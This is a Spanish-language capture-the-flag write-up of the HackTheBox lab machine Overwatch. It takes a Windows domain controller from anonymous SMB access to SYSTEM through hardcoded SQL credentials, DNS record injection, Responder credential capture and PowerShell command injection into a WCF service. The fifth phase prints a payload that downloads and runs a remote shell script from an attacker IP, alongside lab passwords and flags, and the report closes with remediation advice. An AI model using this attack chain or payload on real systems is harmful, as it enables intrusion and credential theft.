```
01 — Overview

Resumen Ejecutivo

Este informe documenta el compromiso completo de la máquina HackTheBox Overwatch (10.129.244.81), un servidor Windows Server 2022 que ejecuta un entorno Active Directory bajo el dominio overwatch.htb.

Las pruebas se realizaron desde una perspectiva de caja negra sin credenciales previas. Mediante una combinación de enumeración SMB anónima, ingeniería inversa de un binario .NET de monitorización, envenenamiento DNS a través de BloodyAD, abuso de servidores enlazados MSSQL y finalmente inyección de comandos PowerShell en un servicio WCF privilegiado, se obtuvo acceso completo a nivel NT AUTHORITY\SYSTEM.

Se identificaron 7 findings, 5 de severidad Alta, que demuestran cómo una cadena de misconfiguraciones conduce a la toma de control completa del host.

02 — Scope

Alcance y Metodología

  • 10.129.244.81 — Objetivo Overwatch HTB · Windows Server 2022
  • overwatch.htb — Dominio Active Directory
  • S200401.overwatch.htb — Controlador de Dominio / Servidor SQL

Enfoque de caja negra sin credenciales ni conocimiento previo. Las fases incluyeron: reconocimiento de red, enumeración de servicios, ingeniería inversa de binarios, obtención de credenciales, acceso inicial y escalada local de privilegios hasta NT AUTHORITY\SYSTEM.

03 — Attack Chain

Cadena de Compromiso

Fase 01 · Recon
Reconocimiento y Enumeración de Puertos

Un escaneo completo de puertos con Nmap identificó 21 puertos TCP abiertos, confirmando el perfil de un Controlador de Dominio Windows. Se destacaron DNS (53), Kerberos (88), LDAP (389), SMB (445), WinRM (5985) y una instancia MSSQL no estándar en el puerto 6520. El dominio y hostname se extrajeron de los banners NTLM de RDP y MSSQL.

nmap -p- --open -sS --min-rate 1000 -n -Pn 10.129.244.81
```

```
Fase 02 · SMB + Reverse Engineering
SMB Anónimo e Ingeniería Inversa del Binario .NET

La enumeración SMB anónima reveló el share software$ accesible sin autenticación. Contenía el directorio Monitoring/ con el binario overwatch.exe y sus dependencias. El binario se descompiló con dnSpy, revelando dos hallazgos críticos en la clase MonitoringService.

smbclient -L \\10.129.244.81 -U ''
```

Sharename    Type
software$   Disk
SYSVOL       Disk

smbclient \10.129.244.81\software$ -U ‘’
smb: > cd Monitoring  
overwatch.exe     AH  9728
overwatch.exe.config  AH  2163
overwatch.pdb     AH  30208

La descompilación reveló:

  • CheckEdgeHistory() — Cadena de conexión SQL en texto claro: Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;
  • KillProcess() — Concatenación directa del parámetro processName en un comando PowerShell sin sanitización → inyección de comandos
```
Fase 03 · DNS Poisoning
Envenenamiento DNS vía BloodyAD

Con las credenciales sqlsvc:TI0LKcfHzZw1Vv se autenticó en MSSQL (puerto 6520). La enumeración de servidores enlazados reveló SQL07, un nombre que no resolvía en DNS. BloodyAD confirmó que sqlsvc tenía permisos WRITE sobre objetos DNS, permitiendo inyectar un registro A apuntando a la IP del atacante.

mssqlclient.py overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@10.129.244.81 -p 6520 -windows-auth
```

SQL> EXEC sp_linkedservers;
S200401\SQLEXPRESS  SQL Server
SQL07               SQL Server  <– unresolved

bloodyAD -d overwatch.htb -u sqlsvc -p TI0LKcfHzZw1Vv   
–dc-ip 10.129.244.81 add dnsRecord SQL07 10.10.15.115

[+] SQL07 has been successfully added
```
Fase 04 · Credential Capture
Captura de credenciales MSSQL en claro con Responder

Con SQL07 resolviendo a la IP del atacante, se lanzó Responder en la interfaz tun0. Al disparar la consulta del servidor enlazado, SQL Server realizó una conexión saliente enviando las credenciales de sqlmgmt en texto claro. Con estas credenciales se obtuvo una shell WinRM y la user flag.

sudo responder -I tun0 -w -d
```

[MSSQL] Cleartext Client  : 10.129.244.81
[MSSQL] Cleartext Hostname: SQL07
[MSSQL] Cleartext Username: sqlmgmt
[MSSQL] Cleartext Password: bIhBbzMMnB82yx

evil-winrm -i 10.129.244.81 -u sqlmgmt -p bIhBbzMMnB82yx
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> cat user.txt
62a1f3fb06c2c857cf2fefabcada7c40
```
Fase 05 · Privilege Escalation
Inyección de Comandos en WCF KillProcess() → SYSTEM

La enumeración post-acceso confirmó que overwatch.exe se ejecutaba como NT AUTHORITY\SYSTEM (PID 4700) exponiendo un servicio WCF SOAP en el puerto 8000. El método KillProcess() concatenaba el parámetro processName directamente en PowerShell sin sanitizar. Se inyectó un payload de reverse shell mediante New-WebServiceProxy.

# Attacker — servidor HTTP y listener
```

python3 -m http.server 80
nc -nlvp 443

# Desde la shell WinRM de sqlmgmt
$wsdl = “http://overwatch.htb:8000/MonitorService?singleWsdl”
$proxy = New-WebServiceProxy -Uri $wsdl -Namespace Monitoring
$proxy.KillProcess(“dummy; iex (New-Object Net.WebClient).DownloadString(‘http://10.10.15.115/shell.ps1’) #”)

# Shell recibida en el atacante
connect to [10.10.15.115] from (UNKNOWN) [10.129.244.81] 59275
whoami
nt authority\system

PS C:\Users\Administrator\Desktop> type root.txt
9a6ea3cdd5e3235b48224790b62790c2
```

06 — Remediation

Resumen de Remediación

  • [Inmediata] Rotar contraseñas sqlsvc y sqlmgmt inmediatamente
  • [Inmediata] Parchear KillProcess() — validar input con whitelist alfanumérica; usar System.Diagnostics.Process.Kill() en lugar de concatenación PowerShell
  • [Corto plazo] Deshabilitar acceso SMB anónimo/invitado; requerir autenticación para todos los shares; eliminar binarios compilados y archivos PDB de recursos de red
  • [Corto plazo] Eliminar permisos WRITE DNS de sqlsvc en AD; monitorizar cambios DNS con Event ID 5137
  • [Corto plazo] Habilitar cifrado TLS en todos los servidores enlazados MSSQL (Force Encryption = Yes); usar Kerberos en lugar de texto claro
  • [Corto plazo] Ejecutar el servicio overwatch.exe bajo una cuenta de mínimo privilegio, no como SYSTEM; restringir acceso de red al puerto 8000
  • [Medio plazo] Nunca incrustar credenciales en código compilado — usar Windows Credential Manager, DPAPI o HashiCorp Vault; implementar pipeline de escaneo de secretos en CI/CD
  • [Medio plazo] Desplegar SIEM + Sysmon para detección: Event ID 5137 (DNS), 4662 (AD WRITE), Sysmon Event 3 (conexiones salientes MSSQL)
```
